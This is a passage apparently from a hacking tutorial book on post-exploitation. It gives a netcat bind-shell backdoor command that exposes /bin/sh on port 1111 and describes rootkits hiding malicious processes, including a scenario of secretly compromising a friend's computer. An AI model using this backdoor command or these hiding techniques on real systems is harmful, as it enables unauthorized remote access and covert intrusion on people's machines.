  md: 'This is also the way we create a backdoor. We start by using the “-e” switch


    to bind the command shell from the target computer to any port. We can later


    create a connection to that port and force the program listed after the “-e”


    switch to start. Type the following command to see this in action:


    nc -l -p 1111 -e /bin/sh


    This command will bring up a shell to anyone who connects to port 1111.


    Remember that any instruction we send now will be executed on the target


    computer.


    Rootkits


    Rootkits are simple little tools that can be easily installed. They are useful


    because you can use them to hide various files and programs so perfectly, as


    if they never existed. You can even hide these files from the operating system


    itself. Because of this functionality, they are used mainly to escape any


    antivirus software and install backdoors or record information.


    Rootkits can also be hooked on to basic calls between the operating system


    and any software. This allows them to even modify basic functionality.


    Imagine the following scenario. Your friend wants to check what programs


    and processes are running on his Windows computer, so he presses CTRL +


    ALT + DEL to open the task manager. He looks at all the software that is


    operating at the time and then moves on. What he didn’t know is that you


    sent a malicious program and you masked it with a rootkit. By hooking a


    rootkit this way, when he opened the task manager, the process behind your


    malicious software vanished. Therefore, he didn’t see anything out of the


    ordinary and moved on.


    For the purpose of this book, we will not dive in deeper into the use of


    rootkits. For now, it’s enough to know the basics of post exploitation. Just


    keep in mind that there are ways to cover your tracks and hide files and'
  merge: -1
